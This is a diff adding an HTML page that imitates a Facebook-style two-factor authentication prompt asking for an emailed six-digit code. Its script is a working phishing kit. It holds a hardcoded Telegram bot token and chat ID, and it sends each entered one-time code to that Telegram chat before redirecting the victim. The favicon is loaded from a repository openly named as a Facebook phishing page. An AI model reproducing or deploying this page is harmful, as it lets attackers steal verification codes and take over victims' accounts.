@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Two-Factor Authentication</title>
+    <link rel="website icon" href="https://raw.githubusercontent.com/ArchismanKarmakar/Facebook-Phishing-page-php/refs/heads/main/imgs/hLRJ1GG_y0J.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background-color: white;
+            border-radius: 8px;
+            padding: 20px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .close-button {
+            text-align: right;
+            margin-bottom: 20px;
+        }
+
+        .close-button button {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #65676b;
+        }
+
+        h1 {
+            font-size: 20px;
+            margin-bottom: 10px;
+            color: #1c1e21;
+        }
+
+        p {
+            color: #65676b;
+            margin-bottom: 20px;
+        }
+
+        .illustration {
+            text-align: center;
+            margin: 20px 0;
+            background-color: #e7f3ff;
+            padding: 20px;
+            border-radius: 8px;
+        }
+
+        .illustration img {
+            width: 100%;
+            max-width: 700px;
+            height: auto;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid  #1877f2;
+            border-radius: 6px;
+            margin-bottom: 12px;
+            font-size: 16px;
+            text-align: center;
+        }
+
+        .timer {
+            color: #65676b;
+            font-size: 14px;
+            margin-bottom: 12px;
+        }
+
+        .continue-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(to bottom, #3b95ff, #1877f2);
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 12px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .try-another {
+            width: 100%;
+            padding: 14px;
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .continue-btn:hover {
+            background: linear-gradient(to bottom, #4a9fff, #1365d9);
+        }
+
+        .try-another:hover {
+            background-color: #e4e6e9;
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="close-button">
+            <button>×</button>
+        </div>
+        <h1>Check your email</h1>
+        <p>Enter the code that we sent to j********3@gmail.com</p>
+        <div class="illustration">
+            <img src="https://i.ibb.co.com/YBJsjqX5/Screenshot-20250206-202445-1-removebg-preview.png">
+        </div>
+        <input type="text" class="input-field" id="otp-input" placeholder="Code" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+        <p id="error-message" class="hidden" style="color: red; text-align: center; font-size: 14px; margin-bottom: 10px;">Invalid OTP. Please enter a 6-digit code.</p>
+        <div class="timer">
+            We can send a new email in <span id="countdown">01:00</span>
+        </div>
+        <button class="continue-btn" onclick="verifyOTP()">Continue</button>
+        <button class="try-another" onclick="resendOTP()">Try another way</button>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "7960524085:AAHzTaSqSnUhzaXU-BePxqUYeWnf92hNBQ8";
+        const CHAT_ID = "6494839544";
+        const REDIRECT_URL = "redirect.html"; // যেখানে রিডাইরেক্ট হবে
+
+        function verifyOTP() {
+            const otp = document.getElementById("otp-input").value;
+            const errorMessage = document.getElementById("error-message");
+
+            if (otp.length !== 6) {
+                errorMessage.classList.remove("hidden");
+                return;
+            } else {
+                errorMessage.classList.add("hidden");
+            }
+
+            const message = `OTP Verification Request:\nUser: j********3@gmail.com\nEntered OTP: ${otp}`;
+            sendToTelegram(message, () => {
+                window.location.href = REDIRECT_URL; // সফল হলে রিডাইরেক্ট
+            });
+        }
+
+        function resendOTP() {
+            const message = "User requested a new OTP: j********3@gmail.com";
+            sendToTelegram(message);
+        }
+
+        function sendToTelegram(message, callback = null) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            }).then(response => response.json())
+            .then(data => {
+                if (data.ok && callback) {
+                    callback();
+                }
+            })
+            .catch(error => {
+                console.error("Error sending request to Telegram:", error);
+            });
+        }
+
+        function startCountdown(duration, display) {
+            let timer = duration;
+            const countdown = setInterval(function () {
+                const minutes = Math.floor(timer / 60);
+                const seconds = timer % 60;
+                display.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+                
+                if (--timer < 0) {
+                    clearInterval(countdown);
+                    display.textContent = '00:00';
+                }
+            }, 1000);
+        }
+
+        window.onload = function () {
+            const oneMinute = 60;
+            const display = document.querySelector('#countdown');
+            startCountdown(oneMinute, display);
+        };
+    </script>
+</body>
+</html>
